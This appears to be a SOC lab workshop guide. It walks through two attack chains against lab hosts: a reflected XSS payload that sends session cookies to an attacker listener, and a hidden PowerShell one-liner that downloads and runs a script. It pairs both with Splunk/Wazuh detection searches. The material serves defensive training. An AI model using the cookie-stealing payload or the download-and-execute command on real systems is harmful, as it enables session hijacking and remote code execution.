
# Karbonbike SOC Lab – Sample Attack Chains & Detections

This document describes **example attack paths** you can run from **Kali** against
the Karbonbike lab, and how they surface in **Splunk / Wazuh / Suricata / OPNsense**.

The goal is to:

- Provide ready-to-demo scenarios for talks & workshops.
- Show how the **pipelines in `lab-topology.md` come alive** during an incident.
- Keep everything reproducible from the CLI (no secret tooling).

---

## 1. Attack Chain A – Kali → Juice Shop (Reflected XSS + Session Hijack)

**Objective:** Steal a logged-in user’s session cookie from **JuiceShopClone** using
a reflected XSS payload, and observe the attack across:

- Juice Shop application logs (`juiceshop:app`)
- OPNsense firewall / Suricata
- (Optionally) Wazuh, if you add matching rules later.

### 1.1 Steps (attacker view – Kali)

1. **Recon the app**

   ```bash
   # Discover the Juice Shop host
   nmap -sV 172.16.58.133

   # Content discovery to find interesting pages
   gobuster dir -u http://172.16.58.133:3000 \
     -w /usr/share/wordlists/dirb/common.txt
````

2. **Identify an XSS sink**

   * Browse to the Juice Shop site in a browser on Kali.
   * Find a form / search field that reflects unsanitised input in the page.

   Quick test payload:

   ```html
   <script>alert('xss')</script>
   ```

3. **Weaponise the payload**

   Use a payload that sends the victim’s cookie to the attacker-controlled endpoint:

   ```html
   <img src="http://172.16.58.54:8081/log?c='+document.cookie+'" />
   ```

   Where `172.16.58.54` is **Kali** running a simple HTTP listener:

   ```bash
   # On Kali
   mkdir -p ~/xss-logs
   cd ~/xss-logs
   python3 -m http.server 8081
   ```

4. **Deliver the payload**

   * Paste the payload into the vulnerable field.
   * Get a victim browser (e.g. on **PC1**) to visit the malicious link or page.
   * Observe incoming requests on Kali’s HTTP server containing `cookie=...`.

5. **Reuse the session**

   * Take the stolen cookie value.
   * In the attacker browser, inject it via dev tools and refresh.
   * You should now impersonate the victim user.

---

### 1.2 Detection points

#### A. Juice Shop application logs → Splunk

Filebeat on `juice` tails the app logs (e.g. `/var/log/juiceshop/app.log`)
and sends them to Logstash → Splunk as `sourcetype=juiceshop:app`.

Basic view:

```spl
index=wazuh sourcetype="juiceshop:app"
| rex field=message "(?<http_method>GET|POST) (?<uri_path>[^ ]+) HTTP/(?<http_version>\d\.\d)"
| stats count by src_ip, uri_path, http_method, status
| sort -count
```

To focus on suspicious payloads:

```spl
index=wazuh sourcetype="juiceshop:app"
| search "<script" OR "onerror=" OR "document.cookie" OR "<img src="
| table _time src_ip uri_path status message
| sort -_time
```

**What to highlight in a demo**

* Requests from Kali’s IP hitting pages with XSS payloads.
* Parameters containing `document.cookie`, `<script>`, etc.
* How you’d convert this into a saved search / alert.

---

#### B. OPNsense / Suricata / Zenarmor → Splunk

Suricata and Zenarmor events go via syslog-ng → Splunk and appear as
`sourcetype=suricata` and `sourcetype=zenarmor`.

Example SPL to see Juice Shop traffic:

```spl
index=main sourcetype=suricata OR sourcetype=zenarmor dest_ip=172.16.58.133
| stats count by src_ip dest_ip dest_port app proto
| sort -count
```

If you enable Suricata rules for web attacks, you can also demo XSS-related signatures:

```spl
index=main sourcetype=suricata dest_ip=172.16.58.133
| search signature="*XSS*" OR signature="*cross-site*"
| table _time src_ip dest_ip dest_port signature severity
| sort -_time
```

---

#### C. Correlating app + network

Example pattern for tying the attacker IP across both layers:

```spl
index=wazuh sourcetype="juiceshop:app"
| search "<script" OR "document.cookie"
| stats values(src_ip) as attacker_ips

index=main sourcetype=suricata OR sourcetype=zenarmor
| search src_ip IN($attacker_ips$)
| stats count by src_ip dest_ip dest_port signature
```

(For production you’d implement this with macros / saved searches; here it’s just a
teaching example.)

---

## 2. Attack Chain B – Kali → Windows (PowerShell Initial Access)

**Objective:** Simulate a simple “phishing-style” initial access to **PC1** or **PC2**
using a PowerShell one-liner, and catch it with:

* Sysmon + Splunk
* Wazuh agent on the endpoint

The payload is intentionally harmless, so this remains a safe teaching lab.

### 2.1 Steps (attacker view – Kali)

1. **Host a demo PowerShell script**

   On Kali:

   ```bash
   cd ~/payloads
   cat > harmless.ps1 << 'EOF'
   Write-Output "Hello from the Karbonbike SOC lab demo payload."
   Start-Sleep -Seconds 5
   EOF

   python3 -m http.server 8082
   ```

2. **Craft a PowerShell one-liner**

   In an email / doc lure, or directly on the Windows host for the lab demo:

   ```powershell
   powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.58.54:8082/harmless.ps1')"
   ```

   Replace `172.16.58.54` with Kali’s IP if different.

3. **Execute on PC1/PC2**

   * Run the command in a PowerShell window on **PC1** or **PC2**.
   * Confirm that Kali’s HTTP server logs a GET request for `harmless.ps1`.

---

### 2.2 Detection points

#### A. Sysmon / Wazuh → Splunk

Assuming:

* Sysmon is installed on the Windows endpoint.
* Wazuh collects Windows Event Logs and forwards to Splunk.

Look for suspicious PowerShell process creation via Wazuh alerts:

```spl
index=wazuh sourcetype="wazuh-alerts"
| search data.win.eventdata.Image="*powershell.exe*"
| table _time agent.name data.win.eventdata.Image \
       data.win.eventdata.CommandLine rule.description
| sort -_time
```

You should see an event where:

* `CommandLine` includes `DownloadString` and the Kali IP.
* The Wazuh rule describes process execution or script-block anomalies.

If you also forward raw Sysmon logs:

```spl
index=wazuh sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search Image="*powershell.exe*"
| table _time Computer Image CommandLine ParentImage ParentCommandLine
| sort -_time
```

Talking points:

* Parent / child process relationships (`ParentImage`, `ParentCommandLine`).
* Distinguishing admin automation vs. likely-malicious script activity.

---

#### B. Network visibility (optional)

Use Suricata / Zenarmor data to show the same connection from PC1 → Kali:

```spl
index=main sourcetype=suricata OR sourcetype=zenarmor
| search dest_ip=172.16.58.54 dest_port=8082
| stats count by src_ip dest_ip dest_port app proto
| sort -_time
```

Now you can tell a story like:

> “Here is the endpoint process that ran PowerShell, and here is the network flow
> from that same host to an untrusted IP (Kali).”

---

## 3. Using these chains in workshops

A simple structure for a 60–90 minute session based on this doc:

1. **Lab overview (10 min)**

   * Walk through `lab-topology.md`.
   * Identify where each log source lives (Wazuh, Suricata, Zenarmor, Juice Shop, Sysmon).

2. **Attack Chain A – XSS → session hijack (25–30 min)**

   * Demo the XSS and cookie theft from Kali.
   * Pivot into Splunk to show web + network traces.
   * Discuss how to turn the SPL into alerts / detections.

3. **Attack Chain B – PowerShell initial access (25–30 min)**

   * Run the PowerShell one-liner on PC1/PC2.
   * Show Wazuh / Sysmon events and process trees in Splunk.
   * Discuss detection logic (command-line patterns, parent processes, destinations).

4. **Discussion & extensions (10–20 min)**

   * How FleetDM and Velociraptor could be used for deeper hunting on the same incidents.
   * How to scale from this lab to a bigger SOC environment.

---

## 4. Future chains to add

Ideas for future sections in this file:

* **DFIR chain:** small malware simulation, then triage with Velociraptor collections.
* **FleetDM hunt:** suspicious process / socket inventory across multiple endpoints.
* **Suricata-heavy chain:** port-scans, exploit attempts, IDS signatures, and tuning.

For now, the two chains above are enough to:

* Prove the lab pipelines work end-to-end.
* Give you two polished demo stories for meetups, conferences, and training.

